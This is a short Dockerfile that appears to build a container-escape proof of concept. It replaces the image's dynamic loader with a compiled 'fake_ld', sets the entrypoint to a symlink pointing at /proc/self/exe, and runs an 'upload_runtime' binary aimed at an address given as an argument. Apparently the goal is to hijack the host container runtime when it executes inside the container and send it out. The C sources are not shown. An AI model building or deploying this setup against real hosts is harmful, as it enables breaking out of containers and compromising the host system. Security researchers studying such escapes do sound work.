FROM gcc:9.4.0 AS compile

WORKDIR /root
COPY ["upload_runtime.c", "upload_runtime.h", "wait_for_exec.c", \
      "wait_for_exec.h", "consts.h", "fake_ld.c", \
      "/root/"]

RUN gcc -static -s upload_runtime.c wait_for_exec.c -o /upload_runtime
RUN gcc -static -nostdlib -fPIC -shared -s fake_ld.c -o /fake_ld

# -------------------------------- #

FROM ubuntu:18.04

RUN apt update && apt install -y curl 

RUN ln -s /proc/self/exe /entrypoint 
RUN cp /lib64/ld-linux-x86-64.so.2 /root/ld-linux-x86-64.so.2
COPY --from=compile /upload_runtime /upload_runtime
COPY --from=compile /fake_ld /lib64/ld-linux-x86-64.so.2

# entrypoint links to /proc/self/exe
ENTRYPOINT ["/entrypoint"]
CMD ["127.0.0.1"] # default address
